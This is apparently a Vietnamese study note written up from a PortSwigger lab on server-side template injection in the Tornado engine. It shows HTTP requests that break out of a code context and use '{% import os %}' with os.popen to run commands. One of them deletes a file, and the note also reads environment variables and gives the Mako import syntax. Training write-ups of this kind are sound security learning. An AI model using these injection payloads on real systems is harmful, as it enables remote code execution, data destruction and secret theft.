![[ssti-tornado.png]]
Lab engine cụ thể Tornado, dùng payload đọc file và xóa morale.txt.

> [!NOTE] phân tích đề
> - đề ghi rõ dùng Tornado template, lại còn là code context (`greeting=data.username`) chứ không phải plaintext `{{7*7}}` thường. Sau khi quan sát gói tin này, mình thấy input nằm trong statement Python nên mình phải break ra khỏi statement trước rồi mới chèn tag.
> - liên quan: [[lys thuyet SSTI]] , [[Lab-SSTI basic]]

### hướng giải
- [ ] login `wiener:peter`.
- [ ] thử `{{7*7}}` xem có tính không.
- [ ] thử break code context bằng `}}` + tag HTML.
- [ ] đọc doc Tornado để tìm syntax import.
- [ ] dùng `{% import os %}` để RCE.

### giải
- mình thử plaintext trước:
```http
GET /?greeting={{7*7}} HTTP/1.1
Host: xxx.web-security-academy.net
```
- -> không ra `49`.
- => vì đang nằm trong code context.
- mình thử break:
```http
GET /?greeting=data.username}}<h1>test</h1> HTTP/1.1
```
- response:
```html
Hello Carlos<h1>test</h1>
```
- -> break được rồi.
- sau đó mình đọc doc Tornado, mình thấy cho import trực tiếp:
```
{% import os %}{{os.popen('id').read()}}
```
- nên mình gửi luôn:
```http
GET /?greeting=data.username}}%0a{%+import+os+%}{{os.popen('rm+/home/carlos/morale.txt').read()}} HTTP/1.1
```
- response trả về blank nhưng không lỗi.
- -> load lại lab thấy solved.
- mình thử thêm đọc env để chắc:
```
{{os.environ}}
```
- -> viết gộp với import ở trên là ra.
- kết quả: `morale.txt` bị xóa.

> [!NOTE] bài học
> - code context thì `{{7*7}}` không đủ.
> - nên mình phải break `}}` trước rồi mới RCE.
> - đọc doc engine luôn nhanh hơn đoán mò.
> - Mako thì tương tự nhưng syntax `<% import os %>`.
